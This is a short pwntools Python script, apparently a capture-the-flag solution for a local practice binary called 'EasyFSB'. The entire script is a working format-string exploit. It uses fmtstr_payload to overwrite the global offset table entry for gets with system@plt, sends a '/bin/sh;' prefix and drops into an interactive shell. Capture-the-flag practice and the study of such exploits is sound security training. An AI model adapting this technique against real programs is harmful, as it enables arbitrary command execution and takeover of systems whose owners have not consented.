from pwn import *

p = process('./prob/EasyFSB')

gets_got = 0x8049898 # <- (disassemble main -> disassemble gets@plt)
system_plt = 0x8048390 # <- disassemble main

payload  = b"/bin/sh;"
payload += fmtstr_payload(8, {gets_got: system_plt}, numbwritten=8)

p.sendline(payload)
p.interactive()